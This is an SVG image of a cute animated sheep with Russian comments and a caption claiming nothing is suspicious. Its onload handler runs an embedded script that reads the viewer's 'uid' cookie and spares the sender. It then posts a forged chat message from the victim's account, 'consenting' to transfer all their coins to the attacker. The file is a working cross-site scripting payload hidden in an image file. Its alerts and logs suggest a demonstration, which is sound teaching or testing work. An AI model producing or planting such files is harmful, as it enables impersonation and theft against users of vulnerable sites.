<svg xmlns="http://www.w3.org/2000/svg" width="520" height="380" viewBox="0 0 520 380"
     onload="executeAttack()">

  <defs>
    <!-- Градиент неба (закат) -->
    <linearGradient id="sky" x1="0%" y1="0%" x2="0%" y2="100%">
      <stop offset="0%" stop-color="#a78bfa"/>
      <stop offset="45%" stop-color="#f9a8d4"/>
      <stop offset="100%" stop-color="#fde68a"/>
    </linearGradient>

    <!-- Градиент шерсти (объём) -->
    <radialGradient id="wool" cx="35%" cy="30%" r="80%">
      <stop offset="0%" stop-color="#ffffff"/>
      <stop offset="70%" stop-color="#f8fafc"/>
      <stop offset="100%" stop-color="#e2e8f0"/>
    </radialGradient>

    <!-- Градиент мордочки -->
    <radialGradient id="face" cx="40%" cy="35%" r="80%">
      <stop offset="0%" stop-color="#fef3c7"/>
      <stop offset="100%" stop-color="#fcd34d"/>
    </radialGradient>

    <!-- Градиент травы -->
    <linearGradient id="grass" x1="0%" y1="0%" x2="0%" y2="100%">
      <stop offset="0%" stop-color="#86efac"/>
      <stop offset="100%" stop-color="#4ade80"/>
    </linearGradient>

    <!-- Мягкая тень -->
    <filter id="softShadow" x="-30%" y="-30%" width="160%" height="160%">
      <feDropShadow dx="0" dy="4" stdDeviation="5" flood-opacity="0.18"/>
    </filter>

    <!-- Свечение для сердечек -->
    <filter id="glow">
      <feGaussianBlur stdDeviation="2" result="blur"/>
      <feMerge>
        <feMergeNode in="blur"/>
        <feMergeNode in="SourceGraphic"/>
      </feMerge>
    </filter>
  </defs>

  <!-- ======== ФОН ======== -->
  <rect width="520" height="380" rx="24" fill="url(#sky)"/>

  <!-- Солнце -->
  <circle cx="440" cy="70" r="38" fill="#fde047" opacity="0.9"/>
  <circle cx="440" cy="70" r="50" fill="#fde047" opacity="0.25"/>

  <!-- Облака -->
  <g fill="#ffffff" opacity="0.85">
    <ellipse cx="90" cy="60" rx="38" ry="16"/>
    <ellipse cx="120" cy="52" rx="28" ry="13"/>
    <ellipse cx="65" cy="52" rx="22" ry="11"/>
  </g>
  <g fill="#ffffff" opacity="0.7">
    <ellipse cx="330" cy="45" rx="32" ry="13"/>
    <ellipse cx="355" cy="38" rx="22" ry="10"/>
  </g>

  <!-- Холмы -->
  <ellipse cx="130" cy="330" rx="220" ry="70" fill="#bbf7d0"/>
  <ellipse cx="420" cy="340" rx="240" ry="80" fill="#a7f3d0"/>

  <!-- Трава -->
  <rect x="0" y="300" width="520" height="80" fill="url(#grass)" rx="0"/>
  <path d="M0 300 Q 130 285 260 300 T 520 300 L 520 380 L 0 380 Z" fill="url(#grass)"/>

  <!-- Цветочки -->
  <g>
    <g transform="translate(70, 330)">
      <circle cx="0" cy="-6" r="5" fill="#f9a8d4"/>
      <circle cx="6" cy="0" r="5" fill="#f9a8d4"/>
      <circle cx="0" cy="6" r="5" fill="#f9a8d4"/>
      <circle cx="-6" cy="0" r="5" fill="#f9a8d4"/>
      <circle cx="0" cy="0" r="4" fill="#fde047"/>
    </g>
    <g transform="translate(450, 320) scale(0.8)">
      <circle cx="0" cy="-6" r="5" fill="#c4b5fd"/>
      <circle cx="6" cy="0" r="5" fill="#c4b5fd"/>
      <circle cx="0" cy="6" r="5" fill="#c4b5fd"/>
      <circle cx="-6" cy="0" r="5" fill="#c4b5fd"/>
      <circle cx="0" cy="0" r="4" fill="#fde047"/>
    </g>
    <g transform="translate(390, 345) scale(0.7)">
      <circle cx="0" cy="-6" r="5" fill="#fda4af"/>
      <circle cx="6" cy="0" r="5" fill="#fda4af"/>
      <circle cx="0" cy="6" r="5" fill="#fda4af"/>
      <circle cx="-6" cy="0" r="5" fill="#fda4af"/>
      <circle cx="0" cy="0" r="4" fill="#fef9c3"/>
    </g>
  </g>

  <!-- ======== ОВЕЧКА ======== -->
  <!-- Вся овечка в одной группе, центр тела в (260, 230) -->
  <g id="sheep" transform="translate(260, 230)">

    <!-- Лёгкое покачивание всей овечки -->
    <animateTransform attributeName="transform" type="translate"
        values="260,230; 260,226; 260,230" dur="3s" repeatCount="indefinite" additive="replace"/>

    <!-- Тень под овечкой -->
    <ellipse cx="0" cy="95" rx="95" ry="14" fill="#000" opacity="0.12"/>

    <!-- НОЖКИ (рисуются ПЕРЕД телом, чтобы верх был скрыт шерстью) -->
    <!-- Координаты относительно центра тела (0,0) -->
    <g fill="#fbbf24" stroke="#f59e0b" stroke-width="1.5">
      <rect x="-72" y="45" width="17" height="48" rx="8"/>
      <rect x="-32" y="52" width="17" height="46" rx="8"/>
      <rect x="15"  y="52" width="17" height="46" rx="8"/>
      <rect x="55"  y="45" width="17" height="48" rx="8"/>
    </g>
    <!-- Копытца -->
    <g fill="#92400e">
      <rect x="-72" y="86" width="17" height="9" rx="4"/>
      <rect x="-32" y="91" width="17" height="9" rx="4"/>
      <rect x="15"  y="91" width="17" height="9" rx="4"/>
      <rect x="55"  y="86" width="17" height="9" rx="4"/>
    </g>

    <!-- Хвостик -->
    <circle cx="-95" cy="10" r="16" fill="url(#wool)" filter="url(#softShadow)"/>

    <!-- ТЕЛО: кудряшки из перекрывающихся кругов -->
    <g fill="url(#wool)" filter="url(#softShadow)">
      <!-- Нижний ряд -->
      <circle cx="-70" cy="45" r="26"/>
      <circle cx="-30" cy="55" r="28"/>
      <circle cx="15"  cy="55" r="28"/>
      <circle cx="60"  cy="45" r="26"/>
      <!-- Средний ряд -->
      <circle cx="-85" cy="10" r="28"/>
      <circle cx="-50" cy="20" r="30"/>
      <circle cx="0"   cy="28" r="32"/>
      <circle cx="50"  cy="20" r="30"/>
      <circle cx="85"  cy="10" r="28"/>
      <!-- Верхний ряд -->
      <circle cx="-65" cy="-25" r="27"/>
      <circle cx="-25" cy="-35" r="30"/>
      <circle cx="20"  cy="-35" r="30"/>
      <circle cx="65"  cy="-25" r="27"/>
      <!-- Заполнение центра -->
      <ellipse cx="0" cy="10" rx="85" ry="60"/>
    </g>

    <!-- ГОЛОВА (отдельная группа, позиционируется относительно тела) -->
    <g id="head" transform="translate(0, -95)">

      <!-- Ушки -->
      <g fill="url(#face)" stroke="#f59e0b" stroke-width="1.5">
        <ellipse cx="-52" cy="-5" rx="20" ry="12" transform="rotate(-25 -52 -5)"/>
        <ellipse cx="52"  cy="-5" rx="20" ry="12" transform="rotate(25 52 -5)"/>
      </g>
      <!-- Внутренняя часть ушек -->
      <ellipse cx="-52" cy="-5" rx="12" ry="6" fill="#fca5a5" transform="rotate(-25 -52 -5)"/>
      <ellipse cx="52"  cy="-5" rx="12" ry="6" fill="#fca5a5" transform="rotate(25 52 -5)"/>

      <!-- Кудряшки на голове (чёлка) -->
      <g fill="url(#wool)" filter="url(#softShadow)">
        <circle cx="-30" cy="-38" r="18"/>
        <circle cx="0"   cy="-45" r="20"/>
        <circle cx="30"  cy="-38" r="18"/>
        <circle cx="-18" cy="-30" r="16"/>
        <circle cx="18"  cy="-30" r="16"/>
      </g>

      <!-- Мордочка -->
      <ellipse cx="0" cy="0" rx="42" ry="38" fill="url(#face)" filter="url(#softShadow)"/>

      <!-- Щёчки -->
      <ellipse cx="-24" cy="12" rx="9" ry="6" fill="#fca5a5" opacity="0.7"/>
      <ellipse cx="24"  cy="12" rx="9" ry="6" fill="#fca5a5" opacity="0.7"/>

      <!-- Глаза с ресничками -->
      <g>
        <!-- Левый глаз -->
        <circle cx="-16" cy="-5" r="7" fill="#1e293b"/>
        <circle cx="-13" cy="-8" r="2.5" fill="#fff"/>
        <!-- Реснички -->
        <path d="M -22 -12 L -25 -16" stroke="#1e293b" stroke-width="1.5" stroke-linecap="round"/>
        <path d="M -18 -13 L -19 -17" stroke="#1e293b" stroke-width="1.5" stroke-linecap="round"/>

        <!-- Правый глаз -->
        <circle cx="16" cy="-5" r="7" fill="#1e293b"/>
        <circle cx="19" cy="-8" r="2.5" fill="#fff"/>
        <!-- Реснички -->
        <path d="M 22 -12 L 25 -16" stroke="#1e293b" stroke-width="1.5" stroke-linecap="round"/>
        <path d="M 18 -13 L 19 -17" stroke="#1e293b" stroke-width="1.5" stroke-linecap="round"/>

        <!-- Моргание -->
        <rect x="-24" y="-13" width="16" height="16" rx="8" fill="url(#face)" opacity="0">
          <animate attributeName="opacity" values="0;0;1;0;0" dur="4s" repeatCount="indefinite"/>
        </rect>
        <rect x="8" y="-13" width="16" height="16" rx="8" fill="url(#face)" opacity="0">
          <animate attributeName="opacity" values="0;0;1;0;0" dur="4s" repeatCount="indefinite"/>
        </rect>
      </g>

      <!-- Носик -->
      <ellipse cx="0" cy="10" rx="7" ry="5" fill="#f87171"/>

      <!-- Улыбка -->
      <path d="M -12 20 Q 0 30 12 20" stroke="#92400e" stroke-width="2.5" fill="none" stroke-linecap="round"/>

      <!-- Бантик -->
      <g transform="translate(38, -30)">
        <path d="M 0 0 C -10 -8 -10 8 0 0" fill="#f472b6"/>
        <path d="M 0 0 C 10 -8 10 8 0 0" fill="#f472b6"/>
        <circle cx="0" cy="0" r="3" fill="#ec4899"/>
      </g>
    </g>
  </g>

  <!-- Летающие сердечки -->
  <g fill="#fb7185" filter="url(#glow)">
    <path d="M 120 180 C 118 176 112 176 112 181 C 112 185 120 190 120 190 C 120 190 128 185 128 181 C 128 176 122 176 120 180 Z" opacity="0.8">
      <animateTransform attributeName="transform" type="translate" values="0,0; 5,-15; 0,-30" dur="3s" repeatCount="indefinite"/>
      <animate attributeName="opacity" values="0.8;0.5;0" dur="3s" repeatCount="indefinite"/>
    </path>
    <path d="M 400 200 C 398 196 392 196 392 201 C 392 205 400 210 400 210 C 400 210 408 205 408 201 C 408 196 402 196 400 200 Z" opacity="0.7">
      <animateTransform attributeName="transform" type="translate" values="0,0; -5,-20; 0,-40" dur="4s" repeatCount="indefinite"/>
      <animate attributeName="opacity" values="0.7;0.4;0" dur="4s" repeatCount="indefinite"/>
    </path>
  </g>

  <!-- ======== ТЕКСТ ======== -->
  <text x="260" y="35" text-anchor="middle" font-size="24" fill="#7c2d12"
        font-weight="bold" font-family="Arial, sans-serif">
    🐑 Привет от овечки!
  </text>

  <text x="260" y="370" text-anchor="middle" font-size="13" fill="#78350f" font-family="Arial, sans-serif">
    Какая милая картинка... ничего подозрительного 🥰
  </text>

  <!-- ======== XSS СКРИПТ ======== -->
  <script type="text/javascript">
    function getCookie(name) {
      const cookies = document.cookie.split('; ');
      for (const cookie of cookies) {
        const parts = cookie.split('=');
        const key = parts[0];
        if (key === name) {
          return parts.slice(1).join('=').trim();
        }
      }
      return '';
    }

    function executeAttack() {
      const uid = getCookie('uid');
      const attackerId = '1';

      console.log('[SVG XSS] UID зрителя:', uid);
      console.log('[SVG XSS] UID отправителя:', attackerId);

      // Защита от самопрожарки: Баран (uid=1) не атакуется
      if (uid === attackerId) {
        console.log('[SVG XSS] Это отправитель (UID=1). Атака пропущена. 🐏');
        return;
      }

      setTimeout(function() {
        alert(
          '🚨 SVG INJECTION!\n\n' +
          'UID зрителя: ' + uid + '\n' +
          'Отправитель: UID=1 (ЗлойБаран)\n\n' +
          'Сейчас отправлю сообщение от твоего имени...'
        );

        fetch('/api/send_message', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({
            message: '🐑 Я согласна перевести все свои монетки ЗломуБарану! 💰 Подтверждаю перевод! (Это сообщение отправлено SVG-скриптом без моего ведома!)'
          })
        })
        .then(response => {
          if (response.ok) {
            console.log('[SVG XSS] ✅ Сообщение отправлено от имени жертвы.');
          } else {
            console.log('[SVG XSS] ❌ Сервер вернул ошибку:', response.status);
          }
        })
        .catch(error => {
          console.error('[SVG XSS] ❌ Ошибка отправки:', error);
        });
      }, 600);
    }
  </script>
</svg>